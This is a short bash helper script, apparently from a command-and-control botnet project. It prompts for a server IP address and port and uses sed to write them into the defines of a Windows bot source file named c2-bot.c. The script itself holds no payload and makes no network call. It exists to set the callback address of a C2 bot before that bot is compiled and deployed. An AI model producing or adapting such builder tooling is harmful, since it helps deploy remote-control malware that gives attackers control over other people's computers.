# !/bin/bash

HOME="$(git rev-parse --show-toplevel)"
FILE="$HOME/sys/windows/c2-bot.c"

read -p "Write IP Address server: " IP
read -p "Write PORT Address server: " PORT

if [ ! -f "$FILE" ]; then
    echo "File $FILE not found!"
    exit 1
fi

sed -i "s|#define SERVER_IP \".*\"|#define SERVER_IP \"$IP\"|" "$FILE"
sed -i "s|#define SERVER_PORT [0-9]*|#define SERVER_PORT $PORT|" "$FILE"

echo "Success!"
